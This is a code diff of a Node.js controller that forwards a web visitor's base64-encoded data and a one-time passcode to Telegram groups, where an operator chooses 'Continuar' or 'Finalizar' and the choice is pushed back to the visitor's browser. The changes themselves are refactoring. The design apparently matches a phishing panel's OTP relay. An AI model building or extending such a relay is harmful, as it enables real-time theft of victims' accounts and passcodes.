@@ -7,8 +7,8 @@ import {
 } from "../services/botService.js";
 
 let ioInstance;
-const activeSessions = new Map();
-const decisionMap = new Map();
+const activeSessions = new Map();   // socketId → session
+const decisionMap = new Map();      // decisionId → socketId
 
 export const setSocketIO = (io) => {
   ioInstance = io;
@@ -18,11 +18,11 @@ let counter = 0;
 
 export const initProcess = async (req, res) => {
   const { data, socketId } = req.body;
+
   try {
     const groupId = counter <= 2 ? process.env.GROUP_1 : process.env.GROUP_2;
     const decrypted = JSON.parse(atob(data));
     const decisionId = `${socketId}-${Date.now()}`;
-    decisionMap.set(decisionId, socketId);
 
     const session = {
       chatId: groupId,
@@ -38,6 +38,7 @@ export const initProcess = async (req, res) => {
     };
 
     activeSessions.set(socketId, session);
+    decisionMap.set(decisionId, socketId);
 
     const messageText = buildMessageText(session);
     const { message_id } = await sendTelegramAlert({
@@ -57,10 +58,10 @@ export const initProcess = async (req, res) => {
 
     waitForDecision(decisionId)
       .then((decision) => {
-        const socketId = decisionMap.get(decisionId);
-        const session = activeSessions.get(socketId);
-        if (session && ioInstance) {
-          ioInstance.to(socketId).emit("decision", decision);
+        const sockId = decisionMap.get(decisionId);
+        const sess = activeSessions.get(sockId);
+        if (sess && ioInstance) {
+          ioInstance.to(sockId).emit("decision", decision);
         }
         decisionMap.delete(decisionId); // Limpieza
       })
@@ -146,33 +147,30 @@ export const updateMessageWithOtp = async (req, res) => {
 
     const messageText = buildMessageText(session);
 
-    // Generar un nuevo decisionId único para este mensaje actualizado
-    const decisionId = `${socketId}-${Date.now()}`;
-    session.decisionId = decisionId;
-    decisionMap.set(decisionId, socketId);
+    const newDecisionId = `${socketId}-otp-${Date.now()}`;
+    session.decisionId = newDecisionId;
+    decisionMap.set(newDecisionId, socketId);
 
     await editTelegramMessage({
       chatId: session.chatId,
       messageId: session.messageId,
       text: messageText,
       reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "Continuar", callback_data: `continue:${decisionId}` },
-            { text: "Finalizar", callback_data: `finalize:${decisionId}` },
-          ],
-        ],
+        inline_keyboard: [[
+          { text: "Continuar", callback_data: `continue:${newDecisionId}` },
+          { text: "Finalizar", callback_data: `finalize:${newDecisionId}` },
+        ]],
       },
     });
 
-    waitForDecision(decisionId)
+    waitForDecision(newDecisionId)
       .then((decision) => {
-        const socketId = decisionMap.get(decisionId);
-        const session = activeSessions.get(socketId);
-        if (session && ioInstance) {
-          ioInstance.to(socketId).emit("final-decision", decision);
+        const sockId = decisionMap.get(newDecisionId);
+        const sess = activeSessions.get(sockId);
+        if (sess && ioInstance) {
+          ioInstance.to(sockId).emit("final-decision", decision);
         }
-        decisionMap.delete(decisionId);
+        decisionMap.delete(newDecisionId);
       })
       .catch((err) => {
         console.error("Timeout esperando decisión del OTP:", err.message);
